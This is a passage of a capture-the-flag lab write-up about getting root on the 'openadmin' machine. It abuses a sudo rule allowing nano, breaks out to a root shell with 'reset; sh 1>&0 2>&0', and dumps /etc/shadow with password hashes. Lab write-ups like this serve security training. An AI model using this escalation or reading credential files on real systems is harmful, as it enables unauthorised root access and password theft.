
---

jimmy did not have much going on but, joanna has some interesting files in her home directory. Besides the user.txt, the files seem to be changing.

```shell
joanna@openadmin:~$ ls
subshell.c  subuid_shell.c  user.txt
joanna@openadmin:~$ ls
46676.php  subshell.c  subuid_shell.c  user.txt
```

Well, let's check what we're allowed to do.

```shell
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

We can run the command ```/bin/nano /opt/priv``` but the file is unwriteable unless we use ```sudo```.

```shell
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

Now with a privileged nano, we can break out into a root shell. Inside nano, use ```^R^X``` to get to the command execution menu. Then execute ```reset; sh 1>&0 2>&0``` ([REF](https://gtfobins.github.io/gtfobins/nano/)). Run ```clear``` and you'll be able to see your shell. I check ```/etc/shadow``` to test my privileges.

```
# cat /etc/shadow
root:$6$BGk6CBPE$FoDCUgY.1pnYDkqDr4.yNm4jQqnnG7side9P6ApdQWWqLr6t1DHq/iXuNF7F0fkivSYXajUp/bK2cw/D/3ubU/:18222:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18113:0:99999:7:::
uuidd:*:18113:0:99999:7:::
dnsmasq:*:18113:0:99999:7:::
landscape:*:18113:0:99999:7:::
pollinate:*:18113:0:99999:7:::
sshd:*:18221:0:99999:7:::
jimmy:$6$XnCB2K/6$QALmpgLWhDwUjcNldzgtafb6Tt1dT.uyIfxdhDYOVGdlNgIyDX89hz29P.aDQM9OBSSsI2dJGUYYTmQtdb2zw.:18222:0:99999:7:::
mysql:!:18221:0:99999:7:::
joanna:$6$gmFfLksM$XJl08bIFRUki/Lecq8RKFzFFvleGn9CjiqrQxU4n/l6JZe/FSRbe0I/W3L86yWibCJejfrMzgH3HvUezxhCWI0:18222:0:99999:7:::
# cd /root
# ls
root.txt
# cat root.txt	 
2f907{---censored---}5b561
```

We got the root flag!
